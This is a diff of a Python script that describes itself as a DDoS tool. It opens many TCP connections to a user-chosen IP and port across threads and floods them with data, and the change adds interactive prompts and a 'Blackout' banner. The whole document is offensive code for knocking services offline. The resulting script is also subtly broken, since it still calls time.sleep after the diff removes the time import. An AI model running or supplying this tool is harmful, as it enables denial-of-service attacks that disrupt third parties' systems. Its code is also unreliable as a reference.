@@ -1,30 +1,27 @@
-import argparse
 import socket
-import os
-import time
 import hashlib
 import threading
+import questionary
 
-def attack(ip, port, size, connections):
+def blackout(ip, port, size, connections):
     data = hashlib.sha512(str(size).encode()).hexdigest()
     addr = (ip, port)
     errors = 0
     socks = []
     
     for _ in range(connections):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2.0)
         try:
-            sock.connect_ex(addr)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(2.0)
+            sock.connect(addr)
             socks.append(sock)
-        except socket.error:
+        except socket.error as e:
             errors += 1
+            print(f"[-] Error connecting to {ip}:{port}: {e}")
+            if len(socks) == 0:
+                return
 
-    if not socks:
-        print(f"[-] Unable to establish any connections to {ip}:{port}")
-        return
-
-    print(f"[*] Launching Attack on {ip}:{port} with {connections} connections...")
+    print(f"[*] Launching Blackout attack on {ip}:{port} with {connections} connections...")
     time.sleep(2.5)
 
     for sock in socks:
@@ -32,49 +29,52 @@ def attack(ip, port, size, connections):
             sock.send(data.encode())
             sock.send('\r\n\r\n'.encode())
             print(f"Attacking {ip}:{port}")
-        except socket.error:
-            print("Connection Error")
+        except socket.error as e:
             errors += 1
+            print(f"[-] Error sending data to {ip}:{port}: {e}")
 
     for sock in socks:
         sock.close()
 
-    print("[*] Attack finished")
+    print("[*] Blackout attack finished")
     print(f"[-] {errors} Errors")
 
 def main():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
     print('''
-    ____  _              ____            
-   / ___|| |_ ___ _ __  |  _ \  _____   __
-   \___ \| __/ _ \ '__| | | | |/ _ \ \ / /
-    ___) | ||  __/ |    | |_| |  __/\ V / 
-   |____/ \__\___|_|    |____/ \___| \_/  
+     _____         ____  _       _               
+    |  ___|__  _ _| __ )(_) __ _| | ___ _ __ ___ 
+    | |_ / _ \| '__|  _ \| |/ _` | |/ _ \ '__/ __|
+    |  _| (_) | |  | |_) | | (_| | |  __/ |  \__ \\
+    |_|  \___/|_|  |____/|_|\__, |_|\___|_|  |___/
+                           |___/                 
     ''')
 
-    parser = argparse.ArgumentParser(description="DDoS script to attack a target with multiple connections.")
-    parser.add_argument('-i', '--ip', help='IP da maquina ou site alvo', required=True)
-    parser.add_argument('-p', '--port', help='Porta para enviar pacotes', required=True, type=int)
-    parser.add_argument('-c', '--connections', help='Numero de requisicoes', required=True, type=int)
-    parser.add_argument('-s', '--size', help='Tamanho de pacotes', required=True, type=int)
-    args = parser.parse_args()
+    try:
+        ip = questionary.text("Enter the target IP address:").ask()
+        port = questionary.text("Enter the target port (default: 80):").ask()
+        port = int(port) if port else 80
 
-    ip = args.ip
-    port = args.port
-    size = args.size
-    connections = args.connections
+        size = questionary.text("Enter the packet size (default: 1024):").ask()
+        size = int(size) if size else 1024
 
-    num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading
+        connections = questionary.text("Enter the number of connections (default: 1000):").ask()
+        connections = int(connections) if connections else 1000
 
-    threads = []
-    for _ in range(num_threads):
-        thread = threading.Thread(target=attack, args=(ip, port, size, connections // num_threads))
-        threads.append(thread)
-        thread.start()
+        num_threads = min(connections, 100)  # Limit the number of threads to prevent overloading
 
-    for thread in threads:
-        thread.join()
+        threads = []
+        for _ in range(num_threads):
+            thread = threading.Thread(target=blackout, args=(ip, port, size, connections // num_threads))
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+    except ValueError:
+        print("[-] Invalid input. Please enter valid numeric values.")
+    except KeyboardInterrupt:
+        print("\n[-] Blackout attack interrupted.")
 
 if __name__ == "__main__":
     main()
+    
